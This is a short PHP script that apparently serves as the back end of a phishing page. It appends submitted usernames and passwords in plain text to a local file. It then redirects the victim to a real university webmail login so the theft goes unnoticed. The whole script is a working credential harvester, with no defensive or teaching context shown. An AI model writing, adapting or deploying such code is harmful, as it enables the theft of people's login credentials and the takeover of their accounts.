<?php
    error_log("submit.php start", 0);
    $data = $_POST['username'] . ' && ' . $_POST['password'] . "\n";
    
    $ret = file_put_contents('userdata.txt', $data, FILE_APPEND | LOCK_EX);
    
    header('Location: https://smail.pwr.edu.pl/');    
?>